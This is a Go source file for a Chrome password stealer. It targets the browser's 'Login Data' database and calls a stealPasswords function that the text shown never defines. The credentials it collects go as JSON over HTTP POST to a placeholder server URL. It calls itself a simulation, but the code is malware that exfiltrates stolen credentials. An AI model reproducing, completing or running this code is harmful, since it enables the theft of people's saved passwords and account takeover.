package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
)

const (
	CHROME_PATH  = `C:\Users\%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data`
	TEMP_DB_PATH = "temp_login_data.db"
	SERVER_URL   = "PUT_SERVER_URL_HERE"
)

func sendToServer(credentials []Credential) error {
	jsonData, err := json.Marshal(credentials)
	if err != nil {
		return fmt.Errorf("failed to marshal credentials: %v", err)
	}

	resp, err := http.Post(SERVER_URL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send to server: %v", err)
	}
	defer resp.Body.Close()

	return nil
}

func cleanup() {
	if _, err := os.Stat(TEMP_DB_PATH); err == nil {
		os.Remove(TEMP_DB_PATH)
	}
}

func main() {
	defer cleanup()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		cleanup()
		os.Exit(0)
	}()

	fmt.Printf("Simulating password steal for user: %s\n", os.Getenv("USERNAME"))
	credentials, err := stealPasswords()
	if err != nil {
		log.Printf("Error stealing passwords: %v", err)
		return
	}
	if len(credentials) > 0 {
		sendToServer(credentials)
	} else {
		log.Println("No passwords stolen or error occurred.")
	}
}
